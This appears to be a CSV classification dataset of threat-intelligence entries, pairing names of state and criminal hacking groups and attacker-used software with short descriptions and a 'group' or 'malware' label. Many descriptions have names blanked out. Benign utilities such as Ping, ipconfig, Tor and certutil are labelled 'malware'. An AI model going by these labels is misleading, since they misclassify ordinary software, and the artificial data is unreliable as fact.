name,description,label
APT-C-36,"is a suspected South America espionage group that has been active since at least 2018. The group mainly targets Colombian government institutions as well as important corporations in the financial sector, petroleum industry, and professional manufacturing.",group
APT1,"is a Chinese threat group that has been attributed to the 2nd Bureau of the People’s Liberation Army (PLA) General Staff Department’s (GSD) 3rd Department, commonly known by its Military Unit Cover Designator (MUCD) as Unit 61398. ",group
APT12,"is a threat group that has been attributed to China. The group has targeted a variety of victims including but not limited to media outlets, high-tech companies, and multiple governments.",group
APT16,is a China-based threat group that has launched spearphishing campaigns targeting Japanese and Taiwanese organizations. ,group
APT17,"is a China-based threat group that has conducted network intrusions against U.S. government entities, the defense industry, law firms, information technology companies, mining companies, and non-government organizations. ",group
APT18,"is a threat group that has operated since at least 2009 and has targeted a range of industries, including technology, manufacturing, human rights groups, government, and medical. ",group
APT19,"is a Chinese-based threat group that has targeted a variety of industries, including defense, finance, energy, pharmaceutical, telecommunications, high tech, education, manufacturing, and legal services. In 2017, a phishing campaign was used to target seven law and investment firms.  Some analysts track  and  as the same group, but it is unclear from open source information if the groups are the same.   ",group
APT28,"is a threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (GTsSS) military unit 26165. This group has been active since at least 2004.          

 reportedly compromised the Hillary Clinton campaign, the Democratic National Committee, and the Democratic Congressional Campaign Committee in 2016 in an attempt to interfere with the U.S. presidential election.  In 2018, the US indicted five GRU Unit 26165 officers associated with  for cyber operations (including close-access operations) conducted between 2014 and 2018 against the World Anti-Doping Agency (WADA), the US Anti-Doping Agency, a US nuclear facility, the Organization for the Prohibition of Chemical Weapons (OPCW), the Spiez Swiss Chemicals Laboratory, and other organizations. Some of these were conducted with the assistance of GRU Unit 74455, which is also referred to as . ",group
APT29,is threat group that has been attributed to the Russian government and has operated since at least 2008.   This group reportedly compromised the Democratic National Committee starting in the summer of 2015. ,group
APT3,"is a China-based threat group that researchers have attributed to China's Ministry of State Security.   This group is responsible for the campaigns known as Operation Clandestine Fox, Operation Clandestine Wolf, and Operation Double Tap.   As of June 2015, the group appears to have shifted from targeting primarily US victims to primarily political organizations in Hong Kong. 

MITRE has also developed an APT3 Adversary Emulation Plan.",group
APT30,"is a threat group suspected to be associated with the Chinese government. While  shares some characteristics with , the two groups do not appear to be exact matches.",group
APT32,"is a threat group that has been active since at least 2014. The group has targeted multiple private sector industries as well as with foreign governments, dissidents, and journalists with a strong focus on Southeast Asian countries like Vietnam, the Philippines, Laos, and Cambodia. They have extensively used strategic web compromises to compromise victims. The group is believed to be Vietnam-based.",group
APT33,"is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors.  ",group
APT37,"is a suspected North Korean cyber espionage group that has been active since at least 2012. The group has targeted victims primarily in South Korea, but also in Japan, Vietnam, Russia, Nepal, China, India, Romania, Kuwait, and other parts of the Middle East.  has also been linked to following campaigns between 2016-2018: Operation Daybreak, Operation Erebus, Golden Time, Evil New Year, Are you Happy?, FreeMilk, Northern Korean Human Rights, and Evil New Year 2018.   

North Korean group definitions are known to have significant overlap, and the name  is known to encompass a broad range of activity. Some organizations use the name Lazarus Group to refer to any activity attributed to North Korea. Some organizations track North Korean clusters or groups such as Bluenoroff, , and  separately, while other organizations may track some activity associated with those group names by the name Lazarus Group.",group
APT38,"is a financially-motivated threat group that is backed by the North Korean regime. The group mainly targets banks and financial institutions and has targeted more than 16 organizations in at least 13 countries since at least 2014.

North Korean group definitions are known to have significant overlap, and the name  is known to encompass a broad range of activity. Some organizations use the name Lazarus Group to refer to any activity attributed to North Korea. Some organizations track North Korean clusters or groups such as Bluenoroff, , and  separately, while other organizations may track some activity associated with those group names by the name Lazarus Group.",group
APT39,is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. ,group
APT41,"is a group that carries out Chinese state-sponsored espionage activity in addition to financially motivated activity.  has been active since as early as 2012. The group has been observed targeting healthcare, telecom, technology, and video game industries in 14 countries.",group
Axiom,"is a cyber espionage group suspected to be associated with the Chinese government. It is responsible for the Operation SMN campaign.  Though both this group and  use the malware , the two groups appear to be distinct based on differences in reporting on the groups' TTPs and targeting.   ",group
BRONZE BUTLER,"is a cyber espionage group with likely Chinese origins that has been active since at least 2008. The group primarily targets Japanese organizations, particularly those in government, biotechnology, electronics manufacturing, and industrial chemistry.",group
BlackOasis,"is a Middle Eastern threat group that is believed to be a customer of Gamma Group. The group has shown interest in prominent figures in the United Nations, as well as opposition bloggers, activists, regional news correspondents, and think tanks.   A group known by Microsoft as  is reportedly associated closely with  operations, but evidence that the group names are aliases has not been identified. ",group
BlackTech,"is a cyber espionage group operating against targets in East Asia, particularly Taiwan, and occasionally, Japan and Hong Kong.",group
Blue Mockingbird,is a cluster of observed activity involving Monero cryptocurrency-mining payloads in dynamic-link library (DLL) form on Windows systems. The earliest observed Blue Mockingbird tools were created in December 2019.,group
Carbanak,"is a threat group that mainly targets banks. It also refers to malware of the same name (). It is sometimes referred to as , but these appear to be two groups using the same  malware and are therefore tracked separately.  ",group
Charming Kitten,"is an Iranian cyber espionage group that has been active since approximately 2014. They appear to focus on targeting individuals of interest to Iran who work in academic research, human rights, and media, with most victims having been located in Iran, the US, Israel, and the UK. [ often tries to access private email and Facebook accounts, and sometimes establishes a foothold on victim computers as a secondary objective. The group's TTPs overlap extensively with another group, , resulting in reporting that may not distinguish between the two groups' activities.",group
Chimera,"is a suspected China-based threat group, targeting the semiconductor industry in Taiwan since at least 2018.",group
Cleaver,is a threat group that has been attributed to Iranian actors and is responsible for activity tracked as Operation Cleaver.  Strong circumstantial evidence suggests Cleaver is linked to Threat Group 2889 (TG-2889). ,group
Cobalt Group,"is a financially motivated threat group that has primarily targeted financial institutions. The group has conducted intrusions to steal money via targeting ATM systems, card processing, payment systems and SWIFT systems.  has mainly targeted banks in Eastern Europe, Central Asia, and Southeast Asia. One of the alleged leaders was arrested in Spain in early 2018, but the group still appears to be active. The group has been known to target organizations in order to use their access to then compromise additional victims.        Reporting indicates there may be links between  and both the malware  and the group . ",group
CopyKittens,"is an Iranian cyber espionage group that has been operating since at least 2013. It has targeted countries including Israel, Saudi Arabia, Turkey, the U.S., Jordan, and Germany. The group is responsible for the campaign known as Operation Wilted Tulip.   ",group
Dark Caracal,is threat group that has been attributed to the Lebanese General Directorate of General Security (GDGS) and has operated since at least 2012. ,group
DarkHydrus,is a threat group that has targeted government agencies and educational institutions in the Middle East since at least 2016. The group heavily leverages open-source tools and custom payloads for carrying out attacks.  ,group
DarkVishnya,is a financially motivated threat actor targeting financial institutions in Eastern Europe. In 2017-2018 the group attacked at least 8 banks in this region.,group
Darkhotel,is a threat group that has been active since at least 2004. The group has conducted activity on hotel and business center Wi‑Fi and physical connections as well as peer-to-peer and file sharing networks. The actors have also conducted spearphishing. ,group
Deep Panda,"is a suspected Chinese threat group known to target many industries, including government, defense, financial, and telecommunications.  The intrusion into healthcare company Anthem has been attributed to .  This group is also known as Shell Crew, WebMasters, KungFu Kittens, and PinkPanther.   also appears to be known as Black Vine based on the attribution of both group names to the Anthem intrusion.  Some analysts track  and  as the same group, but it is unclear from open source information if the groups are the same. ",group
DragonOK,"is a threat group that has targeted Japanese organizations with phishing emails. Due to overlapping TTPs, including similar custom tools,  is thought to have a direct or indirect relationship with the threat group .  It is known to use a variety of malware, including Sysget/HelloBridge, PlugX, PoisonIvy, FormerFirstRat, NFlog, and NewCT. ",group
Dragonfly,"Dragonfly is a cyber espionage group that has been active since at least 2011. They initially targeted defense and aviation companies but shifted to focus on the energy sector in early 2013. They have also targeted companies related to industrial control systems. 

A similar group emerged in 2015 and was identified by Symantec as . There is debate over the extent of the overlap between  and , but there is sufficient evidence to lead to these being tracked as two separate groups. ",group
Dragonfly 2.0,"is a suspected Russian group that has targeted government entities and multiple U.S. critical infrastructure sectors since at least March 2016.   There is debate over the extent of overlap between  and , but there is sufficient evidence to lead to these being tracked as two separate groups. ",group
Dust Storm,"is a threat group that has targeted multiple industries in Japan, South Korea, the United States, Europe, and several Southeast Asian countries. ",group
Elderwood,"is a suspected Chinese cyber espionage group that was reportedly responsible for the 2009 Google intrusion known as Operation Aurora.  The group has targeted defense organizations, supply chain manufacturers, human rights and nongovernmental organizations (NGOs), and IT service providers.  ",group
Equation,is a sophisticated threat group that employs multiple remote access tools. The group is known to use zero-day exploits and has developed the capability to overwrite the firmware of hard disk drives. ,group
FIN10,is a financially motivated threat group that has targeted organizations in North America since at least 2013 through 2016. The group uses stolen data exfiltrated from victims to extort organizations. ,group
FIN4,"is a financially-motivated threat group that has targeted confidential information related to the public financial market, particularly regarding healthcare and pharmaceutical companies, since at least 2013.  is unique in that they do not infect victims with typical persistent malware, but rather they focus on capturing credentials authorized to access email and other non-public correspondence.",group
FIN5,"is a financially motivated threat group that has targeted personally identifiable information and payment card information. The group has been active since at least 2008 and has targeted the restaurant, gaming, and hotel industries. The group is made up of actors who likely speak Russian.   ",group
FIN6,is a cyber crime group that has stolen payment card data and sold it for profit on underground marketplaces. This group has aggressively targeted and compromised point of sale (PoS) systems in the hospitality and retail sectors.,group
FIN7,"is a financially-motivated threat group that has primarily targeted the U.S. retail, restaurant, and hospitality sectors since mid-2015. They often use point-of-sale malware. A portion of  was run out of a front company called Combi Security.  is sometimes referred to as  Group, but these appear to be two groups using the same  malware and are therefore tracked separately.    ",group
FIN8,"is a financially motivated threat group known to launch tailored spearphishing campaigns targeting the retail, restaurant, and hospitality industries.  ",group
Frankenstein,is a campaign carried out between January and April 2019 by unknown threat actors. The campaign name comes from the actors' ability to piece together several unrelated components.  ,group
GCMAN,is a threat group that focuses on targeting banks for the purpose of transferring money to e-currency services. ,group
GOLD SOUTHFIELD,is a financially motivated threat group active since at least 2019 that operates the  Ransomware-as-a Service (RaaS).  provides backend infrastructure for affiliates recruited on underground forums to perpetrate high value deployments.,group
Gallmaker,"is a cyberespionage group that has targeted victims in the Middle East and has been active since at least December 2017. The group has mainly targeted victims in the defense, military, and government sectors.",group
Gamaredon Group,"is a threat group that has been active since at least 2013 and has targeted individuals likely involved in the Ukrainian government. The name  comes from a misspelling of the word ""Armageddon"", which was detected in the adversary's early campaigns.",group
Gorgon Group,"is a threat group consisting of members who are suspected to be Pakistan-based or have other connections to Pakistan. The group has performed a mix of criminal and targeted attacks, including campaigns against government organizations in the United Kingdom, Spain, Russia, and the United States. ",group
Group5,"is a threat group with a suspected Iranian nexus, though this attribution is not definite. The group has targeted individuals connected to the Syrian opposition via spearphishing and watering holes, normally using Syrian and Iranian themes.  has used two commonly available remote access tools (RATs),  and , as well as an Android RAT, DroidJack. ",group
Honeybee,"is a campaign led by an unknown actor that targets humanitarian aid organizations and has been active in Vietnam, Singapore, Argentina, Japan, Indonesia, and Canada. It has been an active operation since August of 2017 and as recently as February 2018. ",group
Inception,"is a cyber espionage group active since at least 2014. The group has targeted multiple industries and governmental entities primarily in Russia, but has also been active in the United States and throughout Europe, Asia, Africa, and the Middle East.",group
Ke3chang,"is a threat group attributed to actors operating out of China.  has targeted several industries, including oil, government, military, and more.   ",group
Kimsuky,is a North Korean-based threat group that has been active since at least September 2013. The group focuses on targeting Korean think tank as well as DPRK/nuclear-related targets. The group was attributed as the actor behind the Korea Hydro & Nuclear Power Co. compromise.,group
Lazarus Group,"is a threat group that has been attributed to the North Korean government. The group has been active since at least 2009 and was reportedly responsible for the November 2014 destructive wiper attack against Sony Pictures Entertainment as part of a campaign named Operation Blockbuster by Novetta. Malware used by  correlates to other reported campaigns, including Operation Flame, Operation 1Mission, Operation Troy, DarkSeoul, and Ten Days of Rain.  In late 2017,  used KillDisk, a disk-wiping tool, in an attack against an online casino based in Central America. 

North Korean group definitions are known to have significant overlap, and the name  is known to encompass a broad range of activity. Some organizations use the name Lazarus Group to refer to any activity attributed to North Korea. Some organizations track North Korean clusters or groups such as Bluenoroff, , and  separately, while other organizations may track some activity associated with those group names by the name Lazarus Group.",group
Leafminer,is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. ,group
Leviathan,"is a cyber espionage group that has been active since at least 2013. The group generally targets defense and government organizations, but has also targeted a range of industries including engineering firms, shipping and transportation, manufacturing, defense, government offices, and research universities in the United States, Western Europe, and along the South China Sea.  ",group
Lotus Blossom,is a threat group that has targeted government and military organizations in Southeast Asia. ,group
Machete,"is a group that has been active since at least 2010, targeting high-profile government entities in Latin American countries.",group
Magic Hound,"is an Iranian-sponsored threat group that conducts long term, resource-intensive operations to collect intelligence, dating back as early as 2014. The group typically targets U.S. and the Middle Eastern military, as well as other organizations with government personnel, via complex social engineering campaigns.",group
Moafee,"is a threat group that appears to operate from the Guandong Province of China. Due to overlapping TTPs, including similar custom tools, Moafee is thought to have a direct or indirect relationship with the threat group . ",group
Mofang,"is a likely China-based cyber espionage group, named for its frequent practice of imitating a victim's infrastructure. This adversary has been observed since at least May 2012 conducting focused attacks against government and critical infrastructure in Myanmar, as well as several other countries and sectors including military, automobile, and weapons industries.",group
Molerats,"is a politically-motivated threat group that has been operating since 2012. The group's victims have primarily been in the Middle East, Europe, and the United States.  ",group
MuddyWater,"is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to , but the group is believed to be a distinct group possibly motivated by espionage.",group
NEODYMIUM,"is an activity group that conducted a campaign in May 2016 and has heavily targeted Turkish victims. The group has demonstrated similarity to another activity group called  due to overlapping victim and campaign characteristics.    is reportedly associated closely with  operations, but evidence that the group names are aliases has not been identified. ",group
Naikon,"is a threat group that has focused on targets around the South China Sea. The group has been attributed to the Chinese People’s Liberation Army’s (PLA) Chengdu Military Region Second Technical Reconnaissance Bureau(Military Unit Cover Designator 78020). While  shares some characteristics with , the two groups do not appear to be exact matches.",group
Night Dragon,is a campaign name for activity involving a threat group that has conducted activity originating primarily in China. ,group
OilRig,"is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests.       This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.",group
Orangeworm,"is a group that has targeted organizations in the healthcare sector in the United States, Europe, and Asia since at least 2015, likely for the purpose of corporate espionage. ",group
PLATINUM,is an activity group that has targeted victims since at least 2009. The group has focused on targets associated with governments and related organizations in South and Southeast Asia. ,group
PROMETHIUM,is an activity group focused on espionage that has been active since at least 2012. The group has conducted operations globally with a heavy emphasis on Turkish targets.  has demonstrated similarity to another activity group called  due to overlapping victim and campaign characteristics.,group
Patchwork,"is a cyberespionage group that was first observed in December 2015. While the group has not been definitively attributed, circumstantial evidence suggests the group may be a pro-Indian or Indian entity.  has been seen targeting industries related to diplomatic and government agencies. Much of the code used by this group was copied and pasted from online forums.  was also seen operating spearphishing campaigns targeting U.S. think tank groups in March and April of 2018.    ",group
PittyTiger,is a threat group believed to operate out of China that uses multiple different types of malware to maintain command and control.  ,group
Poseidon Group,is a Portuguese-speaking threat group that has been active since at least 2005. The group has a history of using information exfiltrated from victims to blackmail victim companies into contracting the  as a security firm. ,group
Putter Panda,is a Chinese threat group that has been attributed to Unit 61486 of the 12th Bureau of the PLA’s 3rd General Staff Department (GSD). ,group
RTM,is a cybercriminal group that has been active since at least 2015 and is primarily interested in users of remote banking systems in Russia and neighboring countries. The group uses a Trojan by the same name (). ,group
Rancor,is a threat group that has led targeted campaigns against the South East Asia region.  uses politically-motivated lures to entice victims to open malicious documents. ,group
Rocke,"is an alleged Chinese-speaking adversary whose primary objective appeared to be cryptojacking, or stealing victim system resources for the purposes of mining cryptocurrency. The name  comes from the email address ""rocke@live.cn"" used to create the wallet which held collected cryptocurrency. Researchers have detected overlaps between  and the Iron Cybercrime Group, though this attribution has not been confirmed.",group
Sandworm Team,is a destructive Russian threat group that has been attributed to Russian GRU Unit 74455 by the U.S. Department of Justice and U.K. National Cyber Security Centre. 's most notable attacks include the 2015 and 2016 targeting of Ukrainian electrical companies and 2017's  attacks.  has been active since at least 2009.,group
Scarlet Mimic,"is a threat group that has targeted minority rights activists. This group has not been directly linked to a government source, but the group's motivations appear to overlap with those of the Chinese government. While there is some overlap between IP addresses used by  and , it has not been concluded that the groups are the same. ",group
Sharpshooter,"Operation  is the name of a cyber espionage campaign discovered in October 2018 targeting nuclear, defense, energy, and financial companies. Though overlaps between this adversary and  have been noted, definitive links have not been established.",group
Silence,"is a financially motivated threat actor targeting financial institutions in different countries. The group was first seen in June 2016. Their main targets reside in Russia, Ukraine, Belarus, Azerbaijan, Poland and Kazakhstan. They compromised various banking systems, including the Russian Central Bank's Automated Workstation Client, ATMs, and card processing. ",group
SilverTerrier,"is a Nigerian threat group that has been seen active since 2014.  mainly targets organizations in high technology, higher education, and manufacturing.",group
Soft Cell,Operation  is a group that is reportedly affiliated with China and is likely state-sponsored. The group has operated since at least 2012 and has compromised high-profile telecommunications networks.,group
Sowbug,"is a threat group that has conducted targeted attacks against organizations in South America and Southeast Asia, particularly government entities, since at least 2015. ",group
Stealth Falcon,"is a threat group that has conducted targeted spyware attacks against Emirati journalists, activists, and dissidents since at least 2012. Circumstantial evidence suggests there could be a link between this group and the United Arab Emirates (UAE) government, but that has not been confirmed. ",group
Stolen Pencil,"is a threat group likely originating from DPRK that has been active since at least May 2018. The group appears to have targeted academic institutions, but its motives remain unclear.",group
Strider,"is a threat group that has been active since at least 2011 and has targeted victims in Russia, China, Sweden, Belgium, Iran, and Rwanda.",group
Suckfly,is a China-based threat group that has been active since at least 2014. ,group
TA459,"is a threat group believed to operate out of China that has targeted countries including Russia, Belarus, Mongolia, and others. ",group
TA505,is a financially motivated threat group that has been active since at least 2014. The group is known for frequently changing malware and driving global trends in criminal malware distribution.,group
TEMP.Veles,"is a Russia-based threat group that has targeted critical infrastructure. The group has been observed utilizing TRITON, a malware framework designed to manipulate industrial safety systems.",group
Taidoor,is a threat group that has operated since at least 2009 and has primarily targeted the Taiwanese government. ,group
The White Company,"is a likely state-sponsored threat actor with advanced capabilities. From 2017 through 2018, the group led an espionage campaign called Operation Shaheen targeting government and military organizations in Pakistan.",group
Threat Group-1314,is an unattributed threat group that has used compromised credentials to log into a victim's remote access infrastructure. ,group
Threat Group-3390,"is a Chinese threat group that has extensively used strategic Web compromises to target victims.  The group has been active since at least 2010 and has targeted organizations in the aerospace, government, defense, technology, energy, and manufacturing sectors.  ",group
Thrip,"is an espionage group that has targeted satellite communications, telecoms, and defense contractor companies in the U.S. and Southeast Asia. The group uses custom malware as well as ""living off the land"" techniques. ",group
Tropic Trooper,"is an unaffiliated threat group that has led targeted campaigns against targets in Taiwan, the Philippines, and Hong Kong.  focuses on targeting government, healthcare, transportation, and high-tech industries and has been active since 2011.",group
Turla,"is a Russian-based threat group that has infected victims in over 45 countries, spanning a range of industries including government, embassies, military, education, research and pharmaceutical companies since 2004. Heightened activity was seen in mid-2015.  is known for conducting watering hole and spearphishing campaigns and leveraging in-house tools and malware. ’s espionage platform is mainly used against Windows machines, but has also been seen used against macOS and Linux machines.",group
WIRTE,is a threat group that has been active since at least August 2018. The group focuses on targeting Middle East defense and diplomats.,group
Whitefly,"is a cyber espionage group that has been operating since at least 2017. The group has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily interested in stealing large amounts of sensitive information. The group has been linked to an attack against Singapore’s largest public health organization, SingHealth.",group
Windshift,"is a threat group that has been active since at least 2017, targeting specific individuals for surveillance in government departments and critical infrastructure across the Middle East.",group
Winnti Group,"is a threat group with Chinese origins that has been active since at least 2010. The group has heavily targeted the gaming industry, but it has also expanded the scope of its targeting.    Some reporting suggests a number of other groups, including , , and , are closely linked to . ",group
Wizard Spider,"is a financially motivated criminal group that has been conducting ransomware campaigns since at least August 2018 against a variety of organizations, ranging from major corporations to hospitals.",group
admin@338,"is a China-based cyber threat group. It has previously used newsworthy events as lures to deliver malware and has primarily targeted organizations involved in financial, economic, and trade policy, typically using publicly available RATs such as , as well as some non-public backdoors. ",group
menuPass,"is a threat group that appears to originate from China and has been active since approximately 2009. The group has targeted healthcare, defense, aerospace, and government sectors, and has targeted Japanese victims since at least 2014. In 2016 and 2017, the group targeted managed IT service providers, manufacturing and mining companies, and a university.      ",group
UNC2452,"is a suspected Russian state-sponsored threat group responsible for the 2020 SolarWinds software supply chain intrusion. Victims of this campaign include government, consulting, technology, telecom, and other organizations in North America, Europe, Asia, and the Middle East. The group also compromised at least one think tank by late 2019.",group
Arp,displays information about a system's Address Resolution Protocol (ARP) cache. ,malware
BITSAdmin,is a command line tool used to create and manage . ,malware
CARROTBALL,is an FTP downloader utility that has been in use since at least 2019.  has been used as a downloader to install .,malware
Cachedump,is a publicly-available tool that program extracts cached password hashes from a system’s registry. ,malware
CrackMapExec,", or CME, is a post-exploitation tool developed in Python and designed for penetration testing against networks.  collects Active Directory information to conduct lateral movement through targeted networks.",malware
Empire,"is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure  for Windows and Python for Linux/macOS.  was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.",malware
Expand,is a Windows utility used to expand one or more compressed CAB files. It has been used by  to decompress a CAB file into executable content.,malware
FTP,is a utility commonly available with operating systems to transfer information over the File Transfer Protocol (FTP). Adversaries can use it to transfer other tools onto a system or to exfiltrate data. ,malware
Fgdump,is a Windows password hash dumper. ,malware
Forfiles,"is a Windows utility commonly used in batch jobs to execute commands on one or more selected files or directories (ex: list all directories in a drive, read the first line of all files created yesterday, etc.). Forfiles can be executed from either the command line, Run window, or batch files/scripts. ",malware
HTRAN,is a tool that proxies connections through intermediate hops and aids users in disguising their true geographical location. It can be used by adversaries to hide their location when interacting with the victim networks. ,malware
Havij,is an automatic SQL Injection tool distributed by the Iranian ITSecTeam security company. Havij has been used by penetration testers and adversaries. ,malware
Imminent Monitor,"was a commodity remote access tool (RAT) offered for sale from 2012 until 2019, when an operation was conducted to take down the Imminent Monitor infrastructure. Various cracked versions and variations of this RAT are still in circulation.",malware
Impacket,"is an open source collection of modules written in Python for programmatically constructing and manipulating network protocols.  contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks.",malware
Invoke-PSImage,"takes a PowerShell script and embeds the bytes of the script into the pixels of a PNG image. It generates a one liner for executing either from a file of from the web. Example of usage is embedding the PowerShell code from the Invoke-Mimikatz module and embed it into an image file. By calling the image file from a macro for example, the macro will download the picture and execute the PowerShell code, which in this case will dump the passwords. ",malware
Koadic,is a Windows post-exploitation framework and penetration testing tool.  is publicly available on GitHub and the tool is executed via the command-line.  has several options for staging payloads and creating implants.  performs most of its operations using Windows Script Host.  ,malware
LaZagne,"is a post-exploitation, open-source tool used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, but is mainly focused on Windows systems.  is publicly available on GitHub.",malware
Lslsass,is a publicly-available tool that can dump active logon session password hashes from the lsass process. ,malware
MCMD,is a remote access tool that provides remote command shell capability used by .,malware
MailSniper,"MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used by a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain.",malware
MimiPenguin,"is a credential dumper, similar to , designed specifically for Linux platforms. ",malware
Mimikatz,"is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks.  ",malware
Net,"The  utility is a component of the Windows operating system. It is used in command-line operations for control of users, groups, services, and network connections. 

 has a great deal of functionality,  much of which is useful for an adversary, such as gathering system and network information for Discovery, moving laterally through  using <code>net use</code> commands, and interacting with services. The net1.exe utility is executed for certain functionality when net.exe is run and can be used directly in commands such as <code>net1 user</code>.",malware
Nltest,is a Windows command-line utility used to list domain controllers and enumerate domain trusts.,malware
Pass-The-Hash Toolkit,"is a toolkit that allows an adversary to ""pass"" a password hash (without knowing the original password) to log in to systems. ",malware
Ping,is an operating system utility commonly used to troubleshoot and verify network connections. ,malware
PoshC2,"is an open source remote administration and post-exploitation framework that is publicly available on GitHub. The server-side components of the tool are primarily written in Python, while the implants are written in . Although  is primarily focused on Windows implantation, it does contain a basic Python dropper for Linux/macOS.",malware
PowerSploit,"is an open source, offensive security framework comprised of  modules and scripts that perform a wide range of tasks related to penetration testing such as code execution, persistence, bypassing anti-virus, recon, and exfiltration.   ",malware
PsExec,is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers.  ,malware
Pupy,"is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool.  It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.).   is publicly available on GitHub. ",malware
QuasarRAT,"is an open-source, remote access tool that is publicly available on GitHub.  is developed in the C# language.  ",malware
RawDisk,"is a legitimate commercial driver from the EldoS Corporation that is used for interacting with files, disks, and partitions. The driver allows for direct modification of data on a local computer's hard drive. In some cases, the tool can enact these raw disk modifications from user-mode processes, circumventing Windows operating system security features.",malware
Reg,"is a Windows utility used to interact with the Windows Registry. It can be used at the command-line interface to query, add, modify, and remove information. 

Utilities such as  are known to be used by persistent threats. ",malware
Remcos,is a closed-source tool that is marketed as a remote control and surveillance software by a company called Breaking Security.  has been observed being used in malware campaigns.,malware
Responder,"Responder is an open source tool used for LLMNR, NBT-NS and MDNS poisoning, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. ",malware
Ruler,"is a tool to abuse Microsoft Exchange services. It is publicly available on GitHub and the tool is executed via the command line. The creators of  have also released a defensive tool, NotRuler, to detect its usage.",malware
SDelete,is an application that securely deletes data in a way that makes it unrecoverable. It is part of the Microsoft Sysinternals suite of tools. ,malware
ShimRatReporter,"is a tool used by suspected Chinese adversary  to automatically conduct initial discovery. The details from this discovery are used to customize follow-on payloads (such as ) as well as set up faux infrastructure which mimics the adversary's targets.  has been used in campaigns targeting multiple countries and sectors including government, military, critical infrastructure, automobile, and weapons development.",malware
Systeminfo,is a Windows utility that can be used to gather detailed information about a computer. ,malware
Tasklist,The  utility displays a list of applications and services with their Process IDs (PID) for all tasks running on either a local or a remote computer. It is packaged with Windows operating systems and can be executed from the command-line interface. ,malware
Tor,"is a software suite and network that provides increased anonymity on the Internet. It creates a multi-hop proxy network and utilizes multilayer encryption to protect both the message and routing information.  utilizes ""Onion Routing,"" in which messages are encrypted with multiple layers of encryption; at each step in the proxy network, the topmost layer is decrypted and the contents forwarded on to the next node until it reaches its destination. ",malware
UACMe,is an open source assessment tool that contains many methods for bypassing Windows User Account Control on multiple versions of the operating system. ,malware
Windows Credential Editor,is a password dumping tool. ,malware
Winexe,"is a lightweight, open source tool similar to  designed to allow system administrators to execute commands on remote servers.   is unique in that it is a GNU/Linux based client. ",malware
at,is used to schedule tasks on a system to run at a specified date or time. ,malware
certutil,is a command-line utility that can be used to obtain certificate authority information and configure Certificate Services. ,malware
cmd,"is the Windows command-line interpreter that can be used to interact with systems and execute other processes and utilities. 

Cmd.exe contains native functionality to perform many operations to interact with the system, including listing files in a directory (e.g., <code>dir</code> ), deleting files (e.g., <code>del</code> ), and copying files (e.g., <code>copy</code> ).",malware
dsquery,is a command-line utility that can be used to query Active Directory for information from a system within a domain.  It is typically installed only on Windows Server versions but can be installed on non-server variants through the Microsoft-provided Remote Server Administration Tools bundle.,malware
esentutl,is a command-line tool that provides database utilities for the Windows Extensible Storage Engine.,malware
gsecdump,is a publicly-available credential dumper used to obtain password hashes and LSA secrets from Windows operating systems. ,malware
ifconfig,is a Unix-based utility used to gather information about and interact with the TCP/IP settings on a system. ,malware
ipconfig,"is a Windows utility that can be used to find information about a system's TCP/IP, DNS, DHCP, and adapter configuration. ",malware
meek,is an open-source Tor plugin that tunnels Tor traffic through HTTPS connections.,malware
nbtstat,is a utility used to troubleshoot NetBIOS name resolution. ,malware
netsh,is a scripting utility used to interact with networking components on local or remote systems. ,malware
netstat,"is an operating system utility that displays active TCP connections, listening ports, and network statistics. ",malware
pwdump,is a credential dumper. ,malware
route,can be used to find or change information within the local system IP routing table. ,malware
schtasks,is used to schedule execution of programs or scripts on a Windows system to run at a specific date and time. ,malware
spwebmember,is a Microsoft SharePoint enumeration and data dumping tool written in .NET. ,malware
sqlmap,is an open source penetration testing tool that can be used to automate the process of detecting and exploiting SQL injection flaws. ,malware
xCmd,is an open source tool that is similar to  and allows the user to execute applications on remote systems. ,malware
AdFind,is a free command-line query tool that can be used for gathering information from Active Directory.,malware
BloodHound,is an Active Directory (AD) reconnaissance tool that can reveal hidden relationships and identify attack paths within an AD environment.,malware
3PARA RAT,is a remote access tool (RAT) programmed in C++ that has been used by . ,malware
4H RAT,is malware that has been used by  since at least 2007. ,malware
ABK,is a downloader that has been used by  since at least 2019.,malware
ADVSTORESHELL,is a spying backdoor that has been used by  from at least 2012 to 2016. It is generally used for long-term espionage and is deployed on targets deemed interesting after a reconnaissance phase.  ,malware
ASPXSpy,is a Web shell. It has been modified by  actors to create the ASPXTool version. ,malware
Agent Tesla,is a spyware Trojan written for the .NET framework that has been observed since at least 2014.,malware
Agent.btz,is a worm that primarily spreads itself via removable devices such as USB drives. It reportedly infected U.S. military networks in 2008. ,malware
Anchor,is one of a family of backdoor malware that has been used in conjunction with  on selected high profile targets since at least 2018.,malware
